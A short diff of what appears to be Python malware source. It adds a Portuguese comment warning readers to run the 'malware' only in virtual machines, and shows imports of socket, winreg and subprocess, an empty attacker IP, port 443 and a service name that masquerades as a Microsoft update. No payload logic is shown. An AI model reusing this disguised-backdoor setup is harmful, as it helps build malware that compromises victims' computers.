@@ -6,7 +6,7 @@ import socket
 import winreg
 import subprocess
 
-
+#WARNING: NUNCA EXECUTE ESSE MALWARE NO SEU PROPRIO PC , SE FOR TESTAR , TESTE EM MAQUINAS VIRTUAIS 
 IP = ''
 PORT = 443
 PROGRAM_NAME = 'MicrosoftUpdateServce'
